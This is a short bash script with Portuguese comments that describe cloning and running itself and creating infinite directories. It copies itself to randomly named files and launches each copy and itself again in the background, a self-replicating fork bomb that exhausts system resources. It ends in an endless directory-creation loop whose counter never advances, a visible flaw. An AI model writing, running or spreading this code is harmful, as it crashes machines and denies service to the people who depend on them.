#!/bin/bash
# parte de clonar e executar o script
nome_do_script="$(basename "$0")"
nome_do_novo_script="clone_${RANDOM}.sh"
cp "$nome_do_script" "$nome_do_novo_script"
chmod +x "$nome_do_novo_script"
./"$nome_do_novo_script" &
./"$nome_do_script" &

# parte de criar diretórios infinitos

i=1;
while true; do
mkdir "dir_$i";
i=$((i++));
done